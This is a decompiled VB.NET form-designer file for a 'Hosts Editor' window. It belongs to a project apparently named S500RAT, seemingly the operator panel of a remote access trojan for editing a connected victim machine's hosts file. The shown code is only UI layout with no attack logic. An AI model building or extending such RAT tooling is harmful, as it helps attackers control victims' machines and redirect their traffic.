Namespace S500RAT
	' Token: 0x02000038 RID: 56
	<Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()>
	Public Partial Class FormHosts
		Inherits Global.System.Windows.Forms.Form

		' Token: 0x06000FBE RID: 4030 RVA: 0x000891DC File Offset: 0x000873DC
		<Global.System.Diagnostics.DebuggerNonUserCode()>
		Protected Overrides Sub Dispose(disposing As Boolean)
			Try
				Dim flag As Boolean = disposing AndAlso Me.components IsNot Nothing
				If flag Then
					Me.components.Dispose()
				End If
			Finally
				MyBase.Dispose(disposing)
			End Try
		End Sub

		' Token: 0x06000FBF RID: 4031 RVA: 0x0008922C File Offset: 0x0008742C
		<Global.System.Diagnostics.DebuggerStepThrough()>
		Private Sub InitializeComponent()
			Me.components = New Global.System.ComponentModel.Container()
			Dim componentResourceManager As Global.System.ComponentModel.ComponentResourceManager = New Global.System.ComponentModel.ComponentResourceManager(GetType(Global.S500RAT.FormHosts))
			Me.Timer1 = New Global.System.Windows.Forms.Timer(Me.components)
			Me.UiLabel1 = New Global.Sunny.UI.UILabel()
			Me.ClientInfo = New Global.System.Windows.Forms.Label()
			Me.Guna2ResizeBox1 = New Global.Guna.UI2.WinForms.Guna2ResizeBox()
			Me.T1 = New Global.Sunny.UI.UIRichTextBox()
			Me.SaveSetttings = New Global.Guna.UI2.WinForms.Guna2GradientButton()
			Me.State = New Global.System.Windows.Forms.LinkLabel()
			Me.Timer2 = New Global.System.Windows.Forms.Timer(Me.components)
			Me.Mini = New Global.S500RAT.ValleyMini()
			Me.MAX = New Global.S500RAT.ValleyMax()
			Me.ExitForm = New Global.S500RAT.ValleyClose()
			Me.Guna2BorderlessForm1 = New Global.Guna.UI2.WinForms.Guna2BorderlessForm(Me.components)
			Me.Guna2DragControl1 = New Global.Guna.UI2.WinForms.Guna2DragControl(Me.components)
			MyBase.SuspendLayout()
			Me.Timer1.Interval = 2000
			Me.UiLabel1.AutoSize = True
			Me.UiLabel1.BackColor = Global.System.Drawing.Color.Transparent
			Me.UiLabel1.Font = New Global.System.Drawing.Font("Microsoft YaHei", 9.75F, Global.System.Drawing.FontStyle.Bold, Global.System.Drawing.GraphicsUnit.Point, 0)
			Me.UiLabel1.ForeColor = Global.System.Drawing.Color.White
			Me.UiLabel1.Location = New Global.System.Drawing.Point(21, 19)
			Me.UiLabel1.Name = "UiLabel1"
			Me.UiLabel1.Size = New Global.System.Drawing.Size(90, 19)
			Me.UiLabel1.Style = Global.Sunny.UI.UIStyle.Custom
			Me.UiLabel1.TabIndex = 309
			Me.UiLabel1.Text = "Hosts Editor"
			Me.UiLabel1.TextAlign = Global.System.Drawing.ContentAlignment.MiddleLeft
			Me.ClientInfo.AutoSize = True
			Me.ClientInfo.BackColor = Global.System.Drawing.Color.Transparent
			Me.ClientInfo.Font = New Global.System.Drawing.Font("Microsoft YaHei", 8.25F, Global.System.Drawing.FontStyle.Regular, Global.System.Drawing.GraphicsUnit.Point, 0)
			Me.ClientInfo.ForeColor = Global.System.Drawing.Color.FromArgb(141, 152, 172)
			Me.ClientInfo.Location = New Global.System.Drawing.Point(22, 44)
			Me.ClientInfo.Name = "ClientInfo"
			Me.ClientInfo.Size = New Global.System.Drawing.Size(200, 16)
			Me.ClientInfo.TabIndex = 310
			Me.ClientInfo.Text = "FC / Desktop_3424 / Windows 10 pro"
			Me.Guna2ResizeBox1.Anchor = (Global.System.Windows.Forms.AnchorStyles.Bottom Or Global.System.Windows.Forms.AnchorStyles.Right)
			Me.Guna2ResizeBox1.BackColor = Global.System.Drawing.Color.Transparent
			Me.Guna2ResizeBox1.FillColor = Global.System.Drawing.Color.Silver
			Me.Guna2ResizeBox1.ForeColor = Global.System.Drawing.Color.Empty
			Me.Guna2ResizeBox1.Location = New Global.System.Drawing.Point(576, 414)
			Me.Guna2ResizeBox1.Name = "Guna2ResizeBox1"
			Me.Guna2ResizeBox1.Size = New Global.System.Drawing.Size(17, 19)
			Me.Guna2ResizeBox1.TabIndex = 315
			Me.Guna2ResizeBox1.TargetControl = Me
			Me.Guna2ResizeBox1.UseTransparentBackground = True
			Me.T1.Anchor = (Global.System.Windows.Forms.AnchorStyles.Top Or Global.System.Windows.Forms.AnchorStyles.Bottom Or Global.System.Windows.Forms.AnchorStyles.Left Or Global.System.Windows.Forms.AnchorStyles.Right)
			Me.T1.AutoWordSelection = True
			Me.T1.BackColor = Global.System.Drawing.Color.FromArgb(7, 11, 41)
			Me.T1.FillColor = Global.System.Drawing.Color.FromArgb(26, 31, 55)
			Me.T1.FillColor2 = Global.System.Drawing.SystemColors.WindowFrame
			Me.T1.FillDisableColor = Global.System.Drawing.Color.Red
			Me.T1.Font = New Global.System.Drawing.Font("Arial", 8.25F, Global.System.Drawing.FontStyle.Bold)
			Me.T1.ForeColor = Global.System.Drawing.Color.White
			Me.T1.ForeDisableColor = Global.System.Drawing.Color.Blue
			Me.T1.Location = New Global.System.Drawing.Point(12, 81)
			Me.T1.Margin = New Global.System.Windows.Forms.Padding(3, 5, 3, 5)
			Me.T1.MinimumSize = New Global.System.Drawing.Size(1, 1)
			Me.T1.Name = "T1"
			Me.T1.Padding = New Global.System.Windows.Forms.Padding(2)
			Me.T1.Radius = 8
			Me.T1.RectColor = Global.System.Drawing.Color.FromArgb(26, 31, 55)
			Me.T1.Size = New Global.System.Drawing.Size(580, 287)
			Me.T1.Style = Global.Sunny.UI.UIStyle.Custom
			Me.T1.TabIndex = 314
			Me.T1.TextAlignment = Global.System.Drawing.ContentAlignment.MiddleCenter
			Me.T1.WordWrap = True
			Me.SaveSetttings.Anchor = (Global.System.Windows.Forms.AnchorStyles.Bottom Or Global.System.Windows.Forms.AnchorStyles.Right)
			Me.SaveSetttings.BackColor = Global.System.Drawing.Color.Transparent
			Me.SaveSetttings.BorderRadius = 8
			Me.SaveSetttings.CheckedState.Parent = Me.SaveSetttings
			Me.SaveSetttings.CustomImages.Parent = Me.SaveSetttings
			Me.SaveSetttings.Enabled = False
			Me.SaveSetttings.FillColor = Global.System.Drawing.Color.FromArgb(26, 31, 55)
			Me.SaveSetttings.FillColor2 = Global.System.Drawing.Color.FromArgb(26, 31, 55)
			Me.SaveSetttings.Font = New Global.System.Drawing.Font("Arial", 8.25F, Global.System.Drawing.FontStyle.Bold)
			Me.SaveSetttings.ForeColor = Global.System.Drawing.Color.White
			Me.SaveSetttings.HoverState.Parent = Me.SaveSetttings
			Me.SaveSetttings.Image = CType(componentResourceManager.GetObject("SaveSetttings.Image"), Global.System.Drawing.Image)
			Me.SaveSetttings.ImageAlign = Global.System.Windows.Forms.HorizontalAlignment.Left
			Me.SaveSetttings.Location = New Global.System.Drawing.Point(479, 376)
			Me.SaveSetttings.Name = "SaveSetttings"
			Me.SaveSetttings.ShadowDecoration.Parent = Me.SaveSetttings
			Me.SaveSetttings.Size = New Global.System.Drawing.Size(113, 32)
			Me.SaveSetttings.TabIndex = 468
			Me.SaveSetttings.Text = "Save"
			Me.State.Anchor = (Global.System.Windows.Forms.AnchorStyles.Bottom Or Global.System.Windows.Forms.AnchorStyles.Left)
			Me.State.AutoSize = True
			Me.State.LinkColor = Global.System.Drawing.Color.White
			Me.State.Location = New Global.System.Drawing.Point(22, 414)
			Me.State.Name = "State"
			Me.State.Size = New Global.System.Drawing.Size(16, 13)
			Me.State.TabIndex = 499
			Me.State.TabStop = True
			Me.State.Text = "..."
			Me.Mini.Anchor = (Global.System.Windows.Forms.AnchorStyles.Top Or Global.System.Windows.Forms.AnchorStyles.Right)
			Me.Mini.Cursor = Global.System.Windows.Forms.Cursors.Hand
			Me.Mini.Location = New Global.System.Drawing.Point(520, 12)
			Me.Mini.Name = "Mini"
			Me.Mini.Size = New Global.System.Drawing.Size(20, 20)
			Me.Mini.TabIndex = 589
			Me.Mini.Text = "ValleyMini1"
			Me.MAX.Anchor = (Global.System.Windows.Forms.AnchorStyles.Top Or Global.System.Windows.Forms.AnchorStyles.Right)
			Me.MAX.Cursor = Global.System.Windows.Forms.Cursors.Hand
			Me.MAX.Location = New Global.System.Drawing.Point(546, 12)
			Me.MAX.Name = "MAX"
			Me.MAX.Size = New Global.System.Drawing.Size(20, 20)
			Me.MAX.TabIndex = 588
			Me.MAX.Text = "ValleyMax1"
			Me.ExitForm.Anchor = (Global.System.Windows.Forms.AnchorStyles.Top Or Global.System.Windows.Forms.AnchorStyles.Right)
			Me.ExitForm.Cursor = Global.System.Windows.Forms.Cursors.Hand
			Me.ExitForm.Location = New Global.System.Drawing.Point(572, 12)
			Me.ExitForm.Name = "ExitForm"
			Me.ExitForm.Size = New Global.System.Drawing.Size(20, 20)
			Me.ExitForm.TabIndex = 587
			Me.ExitForm.Text = "ValleyClose1"
			Me.Guna2BorderlessForm1.AnimateWindow = True
			Me.Guna2BorderlessForm1.BorderRadius = 30
			Me.Guna2BorderlessForm1.ContainerControl = Me
			Me.Guna2BorderlessForm1.DockIndicatorColor = Global.System.Drawing.Color.FromArgb(56, 37, 200)
			Me.Guna2BorderlessForm1.DragStartTransparencyValue = 0.6
			Me.Guna2BorderlessForm1.ShadowColor = Global.System.Drawing.Color.FromArgb(56, 37, 200)
			Me.Guna2BorderlessForm1.TransparentWhileDrag = True
			Me.Guna2DragControl1.ContainerControl = Me
			Me.Guna2DragControl1.DockForm = True
			Me.Guna2DragControl1.DockIndicatorColor = Global.System.Drawing.Color.FromArgb(56, 37, 200)
			Me.Guna2DragControl1.DragMode = Global.Guna.UI2.WinForms.Enums.DragMode.Control
			Me.Guna2DragControl1.DragStartTransparencyValue = 0.6
			Me.Guna2DragControl1.TargetControl = Me
			Me.Guna2DragControl1.TransparentWhileDrag = True
			Me.Guna2DragControl1.UseTransparentDrag = True
			MyBase.AutoScaleDimensions = New Global.System.Drawing.SizeF(96F, 96F)
			MyBase.AutoScaleMode = Global.System.Windows.Forms.AutoScaleMode.Dpi
			Me.BackColor = Global.System.Drawing.Color.FromArgb(7, 11, 41)
			MyBase.ClientSize = New Global.System.Drawing.Size(604, 443)
			MyBase.Controls.Add(Me.Mini)
			MyBase.Controls.Add(Me.MAX)
			MyBase.Controls.Add(Me.ExitForm)
			MyBase.Controls.Add(Me.State)
			MyBase.Controls.Add(Me.SaveSetttings)
			MyBase.Controls.Add(Me.Guna2ResizeBox1)
			MyBase.Controls.Add(Me.T1)
			MyBase.Controls.Add(Me.UiLabel1)
			MyBase.Controls.Add(Me.ClientInfo)
			Me.DoubleBuffered = True
			MyBase.FormBorderStyle = Global.System.Windows.Forms.FormBorderStyle.None
			MyBase.Icon = CType(componentResourceManager.GetObject("$this.Icon"), Global.System.Drawing.Icon)
			MyBase.Name = "FormHosts"
			Me.Text = "Hosts"
			MyBase.TopMost = True
			MyBase.ResumeLayout(False)
			MyBase.PerformLayout()
		End Sub

		' Token: 0x0400070F RID: 1807
		Private components As Global.System.ComponentModel.IContainer
	End Class
End Namespace
